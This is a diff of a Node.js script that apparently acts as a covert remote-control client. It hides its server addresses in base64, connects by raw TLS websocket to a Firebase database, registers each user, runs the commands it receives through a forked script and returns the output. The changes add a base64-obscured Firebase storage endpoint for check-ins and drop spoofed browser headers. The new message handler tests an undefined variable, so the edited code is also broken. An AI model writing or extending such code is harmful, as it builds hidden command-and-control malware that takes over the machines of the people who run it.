@@ -2,35 +2,24 @@ const fs = require('fs')
 const tls = require('tls')
 const { execSync, fork } = require('child_process')
 
-const windowsTokens = [
-    'Windows NT 10.0; Win64; x64',
-    'Windows NT 10.0; Win64; x86',
-    'Windows NT 10.0; WOW64',
-    'Windows NT 10.0; Win64',
-    'Windows NT 10.0; x64; rv:99.0',
-    'Windows 11; Win64; x64',
-    'Windows NT 10.0; Win64; x64; Windows 11',
-    'Windows 11; WOW64; Win64',
-    'Windows 11; x64; rv:100.0'
-]
 
-let id = 1
 let mCmd = null
 let mSendData = null
 let mScript = null
-let DATABASE = null
 let CONNECTION = null
 let USER = getUserName()
 let FINISH = new Date().getTime()+21000000
+
+let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
 startServer()
 
 setInterval(() => {
     sendPing(CONNECTION)
-}, 30000)
+}, 60000)
 
 setInterval(async () => {
-    await checkStatus()
+    await checkStatus(false)
 }, 300000)
 
 
@@ -43,7 +32,7 @@ async function startServer() {
         process.exit(0)
     }
 
-    await checkStatus()
+    await checkStatus(true)
     
     await runDynamicServer(module)
 }
@@ -56,7 +45,6 @@ async function onModuleDetails() {
             let database = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L2RhdGFiYXNlLw==')+data.database+'.json')
             
             if (database) {
-                DATABASE = getQueryParam(database, 'ns')
                 await runWebSocket(new URL(database))
             }
 
@@ -75,13 +63,12 @@ async function runWebSocket(url) {
     let host = url.hostname
     let port = 443
     let path = url.pathname + url.search
-    let cmd = "/£uck々you/realtime/"+USER+"/cmd"
 
     let socket = tls.connect({ host, port, servername: host }, () => {
-        socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ${randomWebSocketKey()}\r\nSec-WebSocket-Version: 13\r\nOrigin: https://console.firebase.google.com\r\nUser-Agent: ${randomUserAgent()}\r\n\r\n`);
-        sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"om","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))
-        sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":1}}}}))
-        sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"q","b":{"p":cmd,"h":""}}}))
+        socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ${randomWebSocketKey()}\r\nSec-WebSocket-Version: 13\r\n\r\n`);
+        sendWSMessage(socket, JSON.stringify({ t: 2, s: 'controller', d: { s:0, i:USER } }))
+        sendWSMessage(socket, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
+        sendWSMessage(socket, JSON.stringify({ t: 1, s: 'controller_cmd' }))
         CONNECTION = socket
         console.log('Node: ---SOCKET-CONNECTION-OPEN---')
     })
@@ -108,25 +95,22 @@ async function runWebSocket(url) {
                 let message = payload.toString('utf8')
 
                 try {
-                    let json = JSON.parse(message)
+                    let data = JSON.parse(message)
                     
-                    if (json.d && json.d.b) {
-                        let data = json.d.b
-                        if (data && data.p && data.d && cmd.includes(data.p)) {
-                            if (mSendData) {
-                                if (mSendData != data.d) {
-                                    if (mScript) {
-                                        mScript.send(data.d)
-                                    } else {
-                                        mCmd = data.d
-                                    }
-                                }
-                            } else {
+                    if (condition) {
+                        if (mSendData) {
+                            if (mSendData != data.d) {
                                 if (mScript) {
                                     mScript.send(data.d)
                                 } else {
                                     mCmd = data.d
                                 }
+                            }
+                        } else {
+                            if (mScript) {
+                                mScript.send(data.d)
+                            } else {
+                                mCmd = data.d
                             }
                         }
                     }
@@ -213,27 +197,31 @@ function sendPing(socket) {
 }
 
 
-async function checkStatus() {
+async function checkStatus(firstTime) {
     if (FINISH > 0 && FINISH < new Date().getTime()) {
-        
-        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}}}}}))) {
-            try {
-                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now() }, {
-                    'Content-Type': 'application/json'
-                })
-            } catch (error) {}
-        }
+        try {
+            await postAxios(STORAGE+encodeURIComponent('realtime/'+USER+'.json'), '', {
+                'Content-Type':'0/'+Date.now()
+            })
+        } catch (error) {}
+
+        try {
+            if (CONNECTION) {
+                CONNECTION.destroy()
+                CONNECTION = null
+            }
+        } catch (error) {}
 
         console.log('---COMPLETED---')
         process.exit(0)
     } else {
-        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}}}}}))) {
-            try {
-                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now() }, {
-                    'Content-Type': 'application/json'
-                })
-            } catch (error) {}
-        }
+        if (! firstTime) sendWSMessage(CONNECTION, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
+
+        try {
+            await postAxios(STORAGE+encodeURIComponent('realtime/'+USER+'.json'), '', {
+                'Content-Type':'1/'+Date.now()
+            })
+        } catch (error) {}
     }
 }
 
@@ -282,7 +270,7 @@ async function runDynamicServer(data) {
 
         mScript.on('message', (data) => {
             mSendData = data
-            sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/realtime/"+USER,"d":{"cmd": data}}}}))
+            sendWSMessage(CONNECTION, JSON.stringify(data))
         })
     } catch (error) {
         console.log('Node: ---SCRIPT-RUNNING-ERROR---')
@@ -304,6 +292,16 @@ async function getAxios(url, options = {}) {
     } catch (err) {
         return null
     }
+}
+
+async function postAxios(url, body, data) {
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: data,
+            body: body
+        })
+    } catch (error) {}
 }
 
 async function patchFetch(url, data, headers = {}) {
@@ -360,16 +358,6 @@ function randomWebSocketKey() {
     return Buffer.from(binary, 'binary').toString('base64')
 }
 
-function randInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function randomUserAgent() {
-    let os = windowsTokens[randInt(0, windowsTokens.length - 1)]
-    let major = randInt(112, 141)
-    let chromeVer = `${major}.0.0.0`
-    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Safari/537.36`
-}
 
 function decode(data) {
     return Buffer.from(data, 'base64').toString('utf-8')
